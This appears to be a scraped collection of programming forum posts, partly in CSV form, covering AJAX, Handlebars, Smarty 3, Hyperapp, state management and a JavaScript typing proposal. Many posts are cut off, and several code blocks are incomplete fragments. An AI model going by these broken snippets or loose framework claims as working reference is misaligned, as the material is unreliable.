     PUT http://192.168.1.100:3000/inputs/25 404 (Not Found)

and first thing that it does when page is loaded is to read object from that exact url, and puts it into console. And it reads it fine..

The error points to: jquery-latest witch is sourced it html file:

     &lt;script src=""http://code.jquery.com/jquery-latest.js""&lt;/script&gt;

I only want to change value of output pin in code from 0 to 1.

&amp;nbsp;

**Questions:**

* Do I have to change something in api.js file, because this link is read only?
* Do I have to change something in client.js file, am I not writing it right?
* Is the problem with this jquery-latest code?
* Is there simpler way of publishing orders to url, than this *express* package?",Help with ajax PUT

I like having phpunit, composer, and altax in /usr/local/bin so that I can just call them from anywhere.  I use gulp for livereload and compiling all my less and javascript.  I don't like that every thing you want to do requires you to npm-install another module, even printing the file names requires a separate ""gulp-debug"" package.  I never felt like I mastered it and was just copy/pasting examples.  So, I wondered how tough it would be to make an async, event driven replacement in PHP using React's streams as a startign point.  The basic src() pipe() dest() only took about 3 hours.  Adding the watch() and getting globs to work properly took longer.  It takes the project structure from Altax (where you get a composer.json specific for the build tool in a hidden folder and it doesn't mix with your project's main composer file).

https://github.com/Pulp-tool/pulp-cli

This code has taken a lot of short cuts to make things ""just work"".  Any GH issues pointing where things could be better OOP are welcome.

Things I learned:

ReactPHP's streams cannot be added to the event loop with addReadStream().  You can only deal with streams that have ""real"" resources that can be passed to stream_select().  To overcome this, you can add a userspace function with futureTick() that checks all of your ""other"" streams (sometimes called object streams) to see if any are still open.

ReactPHP's ""end"" method on streams is confusing.  You can use it as a short cut for one write() call and one end() call, but only if you're a read stream.  Write streams will receive the end() call but never any data, and then writing duplex streams that both read and write tends to get a little confusing because the end() method is both called by your code and can be called by an event.  It's hard to explain.

Object streams are different than data streams.  This may be obvious to some people, but in gulp you aren't streaming the file contents from one function to another with special markers for the end's of files (like ""cat""ing a tar file), you're just passing one object for each read() or write() call.  All the objects are vinyl objects which abstract file system calls to deal with files that haven't been created yet or that may exist on a remote server (S3 for example).  In Pulp, all objects are Pulp\Fs\VirtualFile which ""has-a"" SplFileInfo object.

Node's path.relative and path.resolve are really useful

Trying to make an ecosystem of plugins with composer before anything has been published to github is challenging.  You can reference a local git by path, but the documentation is lacking.

Long time lurker here and thought i would share my python learning story i am a network administrator and
i do love my job nothing excites me like designing and deploying a complex network 
and see it up and running. However one of the things that annoyed me in my job was having 
to do repetitive mundane tasks that even though necessary are just mind numbing and boring 
which is why i was always on the lookout for ways to automate those boring tasks.

At first i discovered VBscript which helped a lot (especially if you use secureCRT )
but i wanted more so i started learning Visual C++ i knew how to write code in C++ when
i was in school so that seemed like the next natural step, however i was disappointed 
while Visual C++ is a great language if you want to become a fulltime windows developer
it's just too much for someone who wants to make his day to day work easier with a few lines
of code.

Then a year and a half ago i was having a chat with a buddy of mine discussing programming languages
and i told him i am still looking for that perfect language that has a clear easy syntax, perfect for scripting,
and can be used to build a fully functional application if needed and he suggested i look into python and that 
ladies and gentlemen was the start of my trip down the rabbit hole. I had heard of python before since python 
is used in networking specifically in SDNs so i did some research on good resources for learning
python programming and found an awesome book called ""Python crash course"" by Eric Matthes that book started out by 
teaching you the basics of python in a clear and simple way. Then at the end of the book there are 3 python projects
involving pygame, matplotlib, pygal, and django web framework i also learned how to use git for version control, i loved
every part of it and wanted more.

I started writing tiny python scripts to automate parts of my job, a script to collect data from different network equipment
for audit purposes, a script that would run a few commands here and there, a script that would inject a ridiculous amount of
packets for the purpose of throughput and performance testing i was having a lot of fun. But i wanted more i really liked concept
of developing web apps using django after all everything nowadays is online and in the cloud. So i went back to django and built 
my first web app that site was a simple site that i used at work to store notes and any useful knowledge but it also ran the tiny python scripts 
i had made and showed the results in a nice pretty web page in my browser. One of the problems i faced when deploying django was that windows IIS
is lousy and a pain in the butt to run web apps, so this only meant it was time to go deeper down the rabbit hole and learn about linux, gunicorn,
nginx. For days and weeks tears of frustration flowed and endless cursing and head banging trying to setup my first linux webserver to run my django
apps but finally i figured everything out.

Then six months ago an idea hit me what if i can build a web app hosted in the cloud that can be used by any one to make their IT tasks easier
but since this was going to be a public facing site it can not be sloppy it needed to look good and shiny but that meant going further down the
rabbit hole so now it was time to learn HTML, CSS, javascript, jQuery, ajax and all about AWS and again the tears of frustration flowed again.

My intention is for the admins to be able to  upload menu items as objects with the values which include tea.name, tea.category, among other key/value pairs which are not relevant. So When a user brings up a menu, their is a call to the database to get the tea objects. On the back-end, an array is made which houses each category name. I pass the category name array (catArray) alongside the teas from the database with the res.render route. The data should make a list on the page displaying each category, and the teas which belong in said category.

 My intent was to use an {{#each catArray}} loop, and to nest in there an {{#each teas}} loop. Then within that I was going to use handlebars-helpers to try {{#eq this.name compare=catArray}}. I'm aware there are some inheritance issues with that last bit of logic, but I can't even get to that point. It seems that express-handlebars doesn't support nested loops.

I created a few native JavaScript applications using technologies such as Electron (win32, macos) and Cordova (uwp, android). However, I find them to be extremely heavy: huge memory hogs, sluggish even on top-end hardware, etc.

I suspect most of the cost comes not from the logic but rather from the HTML rendering (the browser engine); I want to explore embedding the JavaScript logic in a native application and wrap it with a native UI. Is there a project that would enable that? An embedded JavaScript engine (or a stripped down embedded node.js as a library) that can load and run the JavaScript logic pieces (with native or polyfilled libraries for all the usual goodness like fetch, Buffer, etc.) and easily make them accessible from the native side.

Think a node.js web service only instead of actually spinning up a network socket just embed the node.js runtime along with the javascript logic inside a native application.

&gt; Unfortunately as most sites now use 'ajax' we can't use the default event listener for page loading. As such we often have to detect for when elements of the page imply they are loading (for instance a loading notification with text or a loading gif). Try to write some code which is given a callback, and tries to detect for these.  
&gt; 
&gt; If the page doesn't appear to be loading, then call the callback, if it does then wait until it has finished (then calls it). We recommend taking longer than an hour but less than 4 hours on this challenge (thinking of edge cases), and trying to think about false positives, the goal is a piece of JS we could copy and paste onto any website and works in the majority of cases.
&gt; 
&gt; Again this code should be able to work in the majority of cases if we copy and pasted it onto any site as a javascript snippet (as a browser extension, we in essence inject javascript into pages to work).
&gt; 
&gt; Code Language:
&gt; Please provide this using Javascript ES 5.0 not ES6 code. You can use anything in default javascript and any chrome extension calls as well.
&gt; 
&gt; 
&gt; Example Code used to call:
&gt; callWhenReadyToGo(callback); //Callback is a function that is called once when ready.
&gt; 
&gt; Additional Note
&gt; Onload and readyState only work for page loads, not for Ajax calls.
&gt; 

So at first I tried to google AJAX listener and found

https://stackoverflow.com/questions/15170480/ajax-listener-rather-than-polling

I'm guessing this person was talking about running calls threw node.js but I'm not sure. 

I also see others are having a similar issue
https://stackoverflow.com/questions/10783463/javascript-detect-ajax-requests

My thoughts now are more leaning towards running everything through a function that runs XMLHttpRequest and keeping track of every call but they want something that can track preexisting ajax requests. Also in vanilla non ES6 so I feel this is a trick question and I sort of ran out of ideas here.


is there something I'm missing? everything I seem to try doesn't work.

1250,2018-02-01 17:58:39,12,4,"There are so many options available today to manage state of your growing app. Three of the most popular ones seem to be redux, mobx and vuex. Obviously, there are many more, which offers us even more choices. But most of us aren't really aware of all the amazing options lying around.

This thread would be a great place to discuss merits, demerits, good points and pain points of various state management libs. And hopefully, it would serve as an enlightening experience for those of us who never knew about some of the finest options available.

Here's my input to start with :

I have worked with redux, mobx and vuex. So, I'll share my opinion about these:

1. **Redux:** (https://redux.js.org/) Redux I guess is the most widely used one among the three. The overall API of redux is really small and the idea of managing small is also pretty straightforward. You simply have single plain javascript object, which stores the state for your whole application.You cannot directly mutate the state, instead you much `dispatch` an `action` to achieve so. Having said that, to build something significant with redux you would need  to get through quite a bit of setup and boilerplate. For eg. to use async operations you would likely need redux-thunk or redux-saga, for forms redux-form etc. For beginners especially, the boilerplate issue is not just confusing but acts as a real roadblock from performing the actual logic they want.  Fortunately, there are some really good efforts to minimize the boilerplate issue and let you concentrate on the logic, such as **redux-box (https://github.com/anish000kumar/redux-box)**. You can simply install redux-box and it would set up redux, redux-saga, react-redux, redux-devtools and any other repetitive boilerplate. Also, the syntax is really clean which makes developer experience much more smoother.

2. **Vuex** :(https://vuex.vuejs.org/en/) Vuex, to me, is best one in terms of developer experience. The usage is really straightforward and for the most part, you won't need a third-party library. Two-way winding, getters, actions (inbuilt API for handling async) are some of the good points about vuex. There is a big downside however, vuex is strictly for vueJS (or atleast I haven't found any resource till date about using it outside vue). One more cool thing about vuex is, it's dev tool works out of the box (you dont need to write some code to detect dev tools or anything)

3. **Mobx** : (https://mobx.js.org/getting-started.html) Mobx is getting wildly popular among the react developers, specially the ones who have been facing boilerplate issue with redux. And mobx is actually pretty awesome. It favours classical paradigm unlike redux and vuex, which favour the functional paradigm instead. Mobx kind of hits the sweet spot between redux and vuex, in terms of developer experience for me. It also has the concept of getters, handing async operations out of the box and much more. It excels vuex in the sense it can be used with any other framework as well. That being said, I guess people often jump to conclusion that mobx is better than redux because of blah blah reasons. To me redux looks much easier to test, debug and predict the state than mobx. Don't get me wrong here, mobx isn't  ""untestable"", ""unpredictable"" or ""not debuggable"",  but relatively I redux really excels in this regard. From perspective of learning curve and developer experience, I would rate mobx as better than redux for sure.

So folks! That's what I have experienced so far. I know many would agree and many won't. But it would be great if you would share why you agree or why not!","Which flux implementation do you like the most - redux, mobx(?), vuex, mobx-state-tree etc"

&gt; var sDoc = app.documents[1]; //second tab in PS

I reference them this way because I need to copy the first opened document into the second document and then the script will place them in the canvas how I need them to be. The rest of the script runs perfectly fine and saves it to a different folder by the desired name.

The problem I am running into is I am not able to run this script if more than two images are loaded into the document. It seems that app.documents is not referencing something right, or I am not understanding what I need to do.

I want this to be able to point to a source folder and loop through all the PNG files *two at a time* then move on to the next set of two until it is done processing everything.

1264,2018-02-06 12:49:39,7,1,"As the front end development technology is getting advanced each day with node.js, another front-end framework has evolved after React JS known as Hyperapp JS. Hyperapp is the latest front-end framework after React JS (1 KB in size) but capable to build sophisticated web applications with less number of steps than its predecessor frameworks.

**What is Hyperapp?**

Hyperapp can be explained with the following points.

* Hyperapp is a lightweight front-end development framework, sized around 1KB and. it is capable of building a wide variety of sophisticated web applications, static and dynamic websites with great ease. It is very simple to understand and fun to use.

* Hyperapp requires node.js, npm, and gulp node modules along with 1 KB Hyperapp module to be installed on your system before we can build a web application in Hyperapp.

* The idea behind the development of the Hyperapp framework is to get more out of less by minimizing dependencies and write simpler software code.

* When comparing Hyperapp with frameworks like React, Preact, Vue, Ember, Mithril, etc., it is a compact API and has built-in-state management with very small bundled sized.

* Hyperapp based web applications support IE10+ browsers and they perform their task quickly on these browsers and are feature-rich web applications.

* Hyperapp has online community support and one can participate in the community that helps in building Hyperapp a stronger front end framework over its competitor.

* Hyperapp based web applications are interactive and responsive web applications. They support and follow the popular principles such as one-way data flow, JSX, and Virtual DOM.

* The Hyperapp framework is based on the Elm architecture. Other frameworks which are built on similar architecture are React, Redux, etc.

* Hyperapp is a combination of a state management with a VDOM engine which helps to support keyed updates and lifecycle events without dependencies.

* Hyperapp is written in ES5 i.e. ECMAScript 5.

In Hyperapp, we can format our code before creating a new commit by using npm run format. Hyperapp developers follow the ideology to keep the files within the application.

**Pros and Cones of Hyperapp**

**Light-weight JavaScript Library:** Well known for its small sized framework it is built for simplicity and to provide ease in building web applications.

**State management:** Hyperapp is based on the Elm Architecture, and it is independent. Therefore, it enables us to build functional web applications with great ease and less lines of code.

**Hyperapp is simple to understand:** When you read a hundred lines of code for Hyperapp you will realize it is very simple to grasp. You can build the web application with less number of dependencies, few lines of code and breaking the app building idea among state, action and view.

**Hyperapp is simply awesome:** Hyperapp framework utilizes every single aspect of the virtual DOM engine. Efforts are being made towards its performance, to make it better than existing front-end frameworks such as React, Vue, etc.

**Not a one-man-effort:** Hyperapp community invites people with innovative ideas. It is not a one-man show like Mithril and Inferno. Hyperapp is thought to be built as multiple people’s project and with their substantial contributions from the community, Hyperapp framework could become one of the best frameworks of its own kind which will flourish long and outdated existing front-end framework soon.

**Basic Example on Hyperapp**

Given below is an example of a simple web application that says “Hello Hyperapp JS”. We will discuss in detail about installing Hyperapp JS and getting started to build a web application in the upcoming articles. To work with the Hyperapp framework, experience with other frameworks is not needed, but the basic knowledge about HTML and JavaScript is required.

    &lt;/html&gt;


**Command to execute Hyperapp application**

We need to execute “npm run watch” at the project root of Hyperapp web application as shown [Here](https://cdnp-2f3a.kxcdn.com/blog/wp-content/uploads/2018/01/npm-run-watch-1024x271.png)

**Output**
Once the application is build successfully, we can see the application loaded at below URL [http:/localhost:3000/] as shown [Here](https://cdnp-2f3a.kxcdn.com/blog/wp-content/uploads/2018/01/Hyperapp-JS-Demo-1024x545.png)

**What’s coming next for Hyperapp?**

[The Amazing Hyperapp](https://hyperapp.js.org/) framework is quite stable now and it is being used to build elegant and pure functional websites. But it is still undergoing improvements with the support of community members and there are many new things which are coming up in the year 2018 such as improved documentation, DevTools integration, etc. to make Hyperapp the best front-end framework. Hyperapp community is still inviting new members to participate in the contribution of Hyperapp front-end framework development, bug fixes, and improvements based on innovative ideas.

Each of these options have 3-15 children checkboxes associated with it that will be conditionally rendered when the parent is checked. Each of these children have 1-5 categories where each category will have 1-20 more checkboxes. It's a mouthful so here's a diagram

    Section title
       Top level options

In total there's about 500 possible checkbox inputs. It's worth noting that the user can select multiple of all level options. I've tried a bunch of different structures but none have been good to work with. All of them so far have been similar to

    section: { 
        top level 1: {
            mid level 1: {

I was going to try putting all the top level in their own object, mid level in their own, and low level in their own and using keys to make it simpler. I think this will still require a lot of looping however and doesn't sound right

1278,2018-02-09 03:18:58,0,1,"In a game that is currently popular, CSGO, there are items. Each item has a float value assigned to it. Each item has a minimum float and maximum float such as 0-1 or 0.06-0.80. Each of these floats can be represented by IEEE754 32-bit single precision. There is an option in the game to ""trade up"" 10 of these items to create one new item. When you trade up 10 items, the float of the resulting item can be calculated as 

    (avg of 10 floats)*(maxwear-of-resulting-item - minwear-of-resulting-item) + minwear-of-resulting-item

What I am struggling with is that because CSGO uses IEEE754 Single Precision, an average such as `0.07777777` will generally end up as `0.0777777731418609619140625`. It would seem like you just take the IEEE754 value of the equation above to get the actual resulting float, but I have had combinations of 10 items where the average was `0.0777777746` which should have been `0.0777777731418609619140625` but it ended up as `0.077777780592441558837890625`. This means that CSGO is doing calculation is a different way or different order than I know of. I have tried every combinations of using IEEE754 numbers and taking the average of 10 items and putting them into the above equation that I can think of, but I still can't figure out a function that works for all combinations of 10 items that I throw at it.

The best function that I have come up with so far is:

I have plenty of internal python modules (on our intranet) and they can all produce sphinx documentation (using the nice readthedoc theme). But they are all published on their own spaces (GitLab Pages), and this space does not provide versionning (how do I get the documentation for v1.0 and not latest, for instance), and file search (sphinx doc only provides a poor javascript search engine).

Ideally, I would like something that I can deploy on https://docs.mywork.com, it can lists all the available packages (with link to their source code), a search engine to search **across** all the documentation, and allow me to choose the version of the documentation.

I see something close with https://docs.openstack.org/ but it looks over complex.
Thanks for your recommendation",How to have local documentation repository?

I'm pretty new to javascript and am looking for a tutorial or some examples on how to implement a global header for multiple pages. 

What I basicly want is that while I'm navigating between all my subpages that the header stays active and is not reloaded with every new html page access. 
Now I understand that this can be accomplished with jquery and ajax.... but I can't seem to find an easy to understand example/tutorial. Does somebody know any good ones? I would really appreciate it. Thanks!


Another solution that could work for me is somehow keep the state of my script within the index.html page running while changing to different subpages without reloading the javascript part everytime.",Ajax global header Tutorial

So, I initially used maps in javascript by just using what I guess is a weak map var myMap = {};. But I wanted access to methods to be able to get properties from the map. So, I used the Map() object.

Why on earth does Map.keys() and Map.value() return iterators? I mostly use python so I expected an array; I use Java too and thought it returned arrays as well; I know java and javascript aren't related. An array seems like a much better object to return than an iterator.

Anyway, I have two other questions.

I need the highest value from the iterator (it's all integers). What is the best way to do this?

What is the best documentation for javascript? I've been using Mozilla's, and just wanted to make sure this was the best source of information.

Do we need anything else? (we do not use frameworks at the moment, there is small consideration for vue or preact, but we do not really need them)

Is webpack needed for small sized projects? Does it help with es6 browser compatibility? One of the devs i spoke to said webpack is adding polyfills for es6. I though babel is taking care of browser compatibility. So a little confused here.",What tools/workflow one should use for small project?

1295,2018-02-18 18:19:33,5,10,"I came across the idea of using proxies to implement loadsh's setters and getters in native javascript syntax. i.e.

    const handler = {

        if (!(name in target)) {
          target[name] = new Proxy({}, handler);

    let p = new Proxy({}, handler);

    p.x.y.z = 'hello';

This is very interesting in my opinion, but it has some limitations. First of all, console.logging it doesn't produce a neat `{x: {y: {z: 'hello'}}}` but [a proxy structure](https://i.imgur.com/eOClsis.png). JSON.stringifying it results in a `Maximum call stack size exceeded` error.

Another thing is that it creates empty proxies everywhere. Getting `p.a.b.c` would return a proxy, and not undefined.

1297,2018-02-19 04:28:40,7,16,"On another subreddit a user created a sample of code that creates promises from scratch. For the most part I understand what is going on but one particular bit really confuses me.

      this.onResolve = this.onResolve.bind(this);
      this.onReject = this.onReject.bind(this);

What this seems to do is take the `onResolve` and `onReject` function on the prototype and make a copy for each individual instance, and rebind the scope to `this` which is the individual instance of the object created. As a result each object created with this class has a copy of both `onResolve` and `onReject`on the prototype and the class object.

1309,2018-02-23 23:10:23,12,0,"The [Smarty 3 template engine](https://github.com/smarty-php/smarty) has tests and works with PHP 7.x, even 7.2  

Modern usage, with composer, or simply:

    require 'smarty/libs/Autoloader.php';
    Smarty_Autoloader::register(true);
    $smarty = new Smarty();

&amp;nbsp;  
Or as always, old style:

    require 'smarty/libs/Smarty.class.php';
    $smarty = new Smarty();

&amp;nbsp;

 * Coming from using Smarty 2 on other projects, using version 3 for 3 years now has been refreshing beyond being able to do template inheritance and give me reasons to write this article.  

 * In Smarty 3, a lot of Backwards Compatibility with the previous version 2 hides a lot of improvements on much shorter and php-like syntax, among other things like convenient “shorthands”. Once you RTFM for Smarty 3 version, and not the forever-google-indexed Smarty 2 manual, seems that Smarty is smart again.  

 * My team uses the latest smarty 3 dev. version on critical, daily usage web applications that need to be fast. We also use it because Separations of Concerns matters, a template engine is NOT in your way once you get used to it, helps and speeds things up in the med-term and why not, we already have to switch between HTML, JS, CSS, PHP, etc. so learning a new syntax is not that hard.  

 * You can choose custom left and right delimiters. I like **&lt;%** and **%&gt;** instead of defaults **{** and **}** to be able to use them with no hassle in javascript templates (see [{literal}](https://www.smarty.net/docs/en/language.function.literal.tpl))  

The examples here are shown using **&lt;%** and **%&gt;** delimiters.  

&amp;nbsp;  
**Error handling**

For some errors, Smarty 3 throws an exception telling you the line of the original template file where the problem is (not the compiled one). Great, thanks, that was not possible in Smarty 2.

&amp;nbsp;  

**Foreach and properties**

Smarty 3 way, php-style:

    &lt;%foreach $array as $key =&gt; $value%&gt;
or
    &lt;%foreach $array as $value%&gt;

&amp;nbsp;  

Old, supported smarty 2 kill-me-please way:

    &lt;%foreach from=$array key=$key item=$value%&gt;

I always forget you can use &lt;%foreachelse%&gt; for a block in case the array is empty.

&amp;nbsp;  

Handy “properties” are there too. Consider:

    &lt;%foreach $rows as $row%&gt;

Then you can use right away

    &lt;%$row@iteration%&gt;

to get 1, 2, 3... with no extra code.

&amp;nbsp;  

Besides @iteration you also have @index, @first, @last, @total, and can break and continue. Love it. Yeah, you can do right away:

    &lt;%if $row@first%&gt;I’m first&lt;%else%&gt;I’m not first&lt;%/if%&gt;

&amp;nbsp;  

Yeah, kill me for inline styles, but being able to do things like that is also nice:

    &lt;tr style=""background-color:&lt;%cycle values=""#fff,#f4f4f4""%&gt;;

&amp;nbsp;  

**Variable assignment**

You can easily assign a value to a template variable in Smarty 3

    &lt;%$myvar=""value""%&gt; or &lt;%$myvar=$other_var%&gt;

&amp;nbsp;  

Old, supported Smarty 2 pain in the ass way:

    &lt;%assign var=myvar value=""value""%&gt;

&amp;nbsp;  

You can use ‘ticks’ (`) to properly cage variable name (i.e. the value of a key from an associative array)

    &lt;%include ""product.tpl"" my_var=""id_`$product.id`""%&gt;

to produce my_var=”id_xxx” for the template

&amp;nbsp;  

Complete documentation of variable value assignment for Smarty 3 is [here](http://www.smarty.net/docs/en/language.syntax.variables.tpl).

&amp;nbsp;  

**Shorthands**

You can

    &lt;%include “my_template.tpl”%&gt;

directly, without having to write file=”...” 

&amp;nbsp;  

The same goes for “block” or “extends”:

    &lt;%extends “parent.tpl”%&gt;
    &lt;%block “modules/my_block.tpl”%&gt;

&amp;nbsp;  

**Capture output**

Directly, using shorthand for capture:

    &lt;%capture ""some_name""%&gt;...some complicated stuff...&lt;%/capture%&gt;

Then you can output it using:

    &lt;%$smarty.capture.some_name%&gt;

Sorry but I have forgotten the Smarty 2 hard way.

&amp;nbsp;  

**Not always obvious**

You can assign whatever you want to a template variable, not only strings or arrays. For example an object to $object and accessing a property:

    &lt;%$object-&gt;property%&gt;

or just calling a method to output some stuff:

    &lt;%$objet-&gt;method($param1, $param2)%&gt;

remember $param1 and $param2 are template variables.

&amp;nbsp;  

You can now use “count” just as any other modifier (gone the Smarty 2 requirement to use @count)

    &lt;%$arr|count%&gt;

&amp;nbsp;  

You can apply any PHP function to a template variable, using the pipeline character (|)

    &lt;%$text|nl2br%&gt;

or using parameters:

    &lt;%$var|myfunction:""param1""%&gt;

&amp;nbsp;  

So you can use sprintf this way:

    &lt;%”%03d”|sprintf:$number%&gt;

&amp;nbsp;  

Or get the peak memory usage by calling the PHP function and apply a custom function (removing the parenthesis)

    &lt;%$mem=memory_get_peak_usage()|humanize_bytes%&gt;

then to print:

    &lt;%$mem%&gt;

&amp;nbsp;  

**Accessing associative arrays**

A shorthand to access associative arrays from Smarty is using dots:

    &lt;%$assoc_arr.key1.key2%&gt;

&amp;nbsp;  

but you can also do it php-style if you wish:

    &lt;%$assoc_arr['key']%&gt;

&amp;nbsp;  

When using variables for keys, you can simply:

    &lt;%$assoc_arr.$keyname%&gt;

but, what if the keyname is from another, nested array. You can do:

    &lt;%$arr['keyname'][$data['other_keyname']]%&gt;

&amp;nbsp;  

or if you want your dot-style, nest the delimiter tags:

    &lt;%$arr.keyname.other_arr.&lt;%$data.other_keyname%&gt;.yet_other_keyname%&gt;

&amp;nbsp;  

**END**

And that's all, appreciate any comments to improve the text / examples

I currently run www.letsjavascript.com. A beginner's project driven course on JavaScript. I recently taught a project at a school to 15 year olds and last year while this course was on Udemy, I got about 3000 people on-board. I wasn't too impressed with Udemy because it induced people to buy courses in bulk due to their exorbitant sales, which doesn't really promote learning. Only course hoarding!

So the basic premise is that each project is approximately 1 hour 30 minute to do. And there are 5 projects so about 6 hours 30 minutes in total to do all. I say 5 because some projects are shorter and 5 sounds more palatable!

I'd like to host an online webinar type event where I can get people to sign up and then do the projects  (either on letsjavascript.com or elsewhere - any ideas?)

The projects cover about 50+ topics and in my experience it really does bootstrap you to start coding in JS, with little - no prior experience. So I really do to make it in such a way that people do complete the projects.

    // 'R' is the return type, everything else are the paramter types
    // 'func' takes the function to execute, variadic parameter because number of arguments is not known beforehand
    // 'params' does hold the supplied parameter values
    // I then use the 'Object.values' method with destructuring to gain access to all values in the right order
    // last but not least I return the correct respone

I'm building a simple chat application using Twilio APIs. My application is a nice React/Redux with a simple data flow. My communication with Twilio, goes through a websocket. Their javascript SDK exposes a ""Room"" object which I would classify as a statefull mutable. It can change on the fly with data coming in/out of the websocket (as soon as a user connect/disconnect for example).

These events then need to propagate to my react/redux components and store. 

Now, I understand its an anti-patten to store this mutable object in the redux store - but if not in the store, where should I store it and still have access to it from every component in my application?

1398,2018-03-24 22:57:56,11,2,"This is a proposal for my idea: to add optional typing to JS. This idea is based on my rudimentary understanding of JS from a background in C#, which, to be honest, is only marginally less rudimentary. When I initially started programming in JS, I was intrigued by the fact that I could only declare a variable without explicitly specifying its type, as that was my only option. Even though the interpreter is able to infer the type based on the values, I think it would be fair to say that I was a bit disappointed that it was not an option for me to declare a variable with an explicit type.

My idea is that the existing keywords in JavaScript such as `let`, `var`, `const` should maintain their respective functions. During the implementation, they may have to be modified slightly but they should ultimately be able to behave as they do now. Meanwhile, keywords such as `bool`, `int`, `float`, `string` should be added to explicitly set the type of the variable. Others before me have already tried to discuss this and push for its implementation, such as the [ES8 Proposal: Optional Static Typing](https://esdiscuss.org/topic/es8-proposal-optional-static-typing) sent to the [es-discuss](https://mail.mozilla.org/listinfo/es-discuss) mailing list, [Do you think ES7 will add optional static typing?](https://www.reddit.com/r/javascript/comments/31qwfa/do_you_think_es7_will_add_optional_static_typing/) posted on this [javascript subreddit](https://www.reddit.com/r/javascript/), or [proposal-optional-type by samuelgoto](https://github.com/samuelgoto/proposal-optional-types) that can be found on [GitHub](https://github.com/). These existing texts are all well-written and contain useful insight, but I would just like to add to them in my proposal and start another discussion around this topic.

There could be many reasons as to why someone may want to specify a variable's type explicitly, such as improving readability and allowing the interpreter to check the type before running the code, giving the programmer greater control over how their program functions. This can promote better workflow and stricter programming practices.

Consider the following lines of code:

    let foo = 0;
    int foo = 0;

In this case, in terms of the code's readability, there is no apparent advantage to either method. However, consider the following lines of code:

    let foo = MyFunction();
    int foo = MyFunction();

In this case, the readability is evidently impacted by whether or not the type is explicitly specified. Where the `let` keyword is used, the person who has to read the code will have no idea what type `foo` will be unless they find the function `MyFunction` and read through it to see what it returns. Of course, internal documentation, in the form of comments, can be added to delineate the same information, however having the type explicitly stated is arguably more efficient documentation. So in this instance, having an explicit type would help with readability. It has been argued that dynamic typing saves the programmer from typing as much as if the language were static typed. This can be refuted because programmers tend to add more documentation in the form of comments when the type is not explicitly specified.

Allowing the programmer to specify the type for a variable could also be of use to the interpreter, where it can check during compile-time and throw errors if it catches any. Consider the following scenario:

*HTML*

    &lt;input type=""number"" id=""num1""&gt;
    &lt;input type=""number"" id=""num2""&gt;
    
    &lt;button onclick=""AddNumbers();""&gt;Add Numbers&lt;/button&gt;

*JS*

    function AddNumbers() {
        let num1 = document.getElementById('num1').value;
        let num2 = document.getElementById('num2').value;
        
        alert(num1 + num2); // Concatenates the strings instead of summing the numbers.
    }

In this case, the plus sign becomes the concatenation operator instead of the addition operator. Clearly the intention of the programmer was to output the sum of the two numbers inputted, however due to not being able to specify the type of the variables, the algorithm has become invalid. If the variable types were specified, the interpreter could have thrown an error when we try to set the variables to strings. This situation is very common, especially with inexperienced programmers and beginners. For example, I personally see this happen in my software class all the time.

Another example of where non-explicit typing could cause some trouble is shown below:

    let foo = ""123/bar"";
    let fooParts = foo.split(""/"");
    
    let fooNumbers = fooParts[0];
    alert(typeof fooNumbers); // Output is 'string'.
    
    if (fooNumbers === 123) {
        MyFunction();
    }

This will not execute the function MyFunction as the programmer intends. The if statement will not return `true` because the variable `fooNumbers` is the wrong type. Although the value of `fooNumbers` is `123`, it is stored as a `string`. This is an example of where lacking explicitly typed variables can cause unforeseen problems in the program that don't get logged as errors in the console. This is an example of how a logic error could be formed and this particular logic error remains invisible because of the lack of explicitly typed variables. If the variable foo were explicitly typed, the interpreter could have either identified the error or implicitly converted the value.

The examples show how explicitly typing could help the programmer gain more control over the programs they write. Giving the programmer the option to set types for the variables they create gives them much of that control. Strongly typed code, where types are explicitly specified, are likely to be more predictable than weakly typed code. In addition, strongly typed programming languages force the programmer to consider the data types, thus they it would encourage them to have actually designed the algorithm more thoroughly before they implement it.

I have consulted my software teacher, who has a rich background in this area, about the implications of such a system as the one I am proposing. I asked about the impact of optional typing, the advantages and the disadvantages. The general response was that the advantages are in line with what I have outlined above and that the disadvantages would be insignificant. He points out that one disadvantage would be the extra steps involved in interpreting and executing the code, but this is minor. In response, he also mentions two examples of existing solutions that already aim to solve the same problems I have addressed. He explains that having explicit typing would also help to keep the code manageable in larger projects in large development teams. This will help to decrease the likelihood of errors in the programs.

One such example of an existing solution to the lack of typing in Javascript is [TypeScript](http://www.typescriptlang.org/), an open-source programming language that was developed by Microsoft to include optional static typing. I feel that there isn't a reason why JavaScript couldn't integrate optional typing and support it natively.

Another workaround, as it is not exactly a solution, is to use JavaScript linters to check your code. I call it a workaround because it does not really solve the problem which I think adding optional typing could fix. Linters like [JSHint](http://jshint.com/) and [JSLint](https://www.jslint.com/) are examples of existing JavaScript linters that check your code and report different metrics and possible problems. [Flow](https://flow.org/) is another existing solution that tracks the types as data moves through your code. Flow gives fast feedback as you program by incrementally rechecking your code as you make changes.

I think implementing optional typing to JS would be advantageous. This is my proposal for adding optional keywords to allow typing in JavaScript. I am looking for feedback and any thoughts on this topic. What do you think of it? Do you agree or disagree with my proposal?",Proposal: Optional Typing for JS

1403,2018-03-26 04:20:51,35,44,"hello,
let me set up the context before asking what exactly I want.

I've been using Javascript for over a year now and I work as a full time Frontend Dev. I have fairly decent knowledge of making apps in react or angular or even getting my hands dirty with vanilla javascript. I have a good idea about the event loop and stuffs like prototypal inheritance and closures and the stuffs that makes ES5 and ES6 apart. 

Now to my actual question.

recently someone here posted about Radi.js and I was really curious about its implementation. So I went up to their github, forked it and took a look at the code and I couldn't understand a damn thing. So I realized that there's a lot to learn. So can anyone point me in the direction, that gives insight on framework implementations, much advanced concepts(which i dont even know what at the moment)?

1404,2018-03-26 16:29:17,4,2,"Hi all,

I am a senior Java developer who has used javascript on and off for about 7 years.

I am currently reading up on ES6 features to become more familiar with them.

The test is based around consuming an API and performing business logic.

With that knowledge I have been brushing up on:

* hoisting and choosing when to use `let` and `const` appropriately
* closure
* async / await
* classes
* template literals for assembling values
* lambdas / anonymous functions.

My question is, if you were a backend node.js developer, what would you look for in this scenario?

I am less worried about design patterns and optimal code, which are just general software best practices in OOP.

p.s. if there are any links or challenges that might help prep, that would be appreciated.

Thanks",Prepping for a coding interview in ES6 on node.js (backend)?
1405,2018-03-26 18:35:53,3,2,"I am in the process of building a website.  One of the functions of this website is a time sheet application.  The full project can be found at: https://github.com/pavulon18/gcas_timesheet_php_website  
Currently, all of the work is being done on the ""initial_development"" branch.

The two files specifically related to this issue are: 
https://github.com/pavulon18/gcas_timesheet_php_website/blob/initial_development/views/main.php 
and
https://github.com/pavulon18/gcas_timesheet_php_website/blob/initial_development/views/employees/currentpay.php

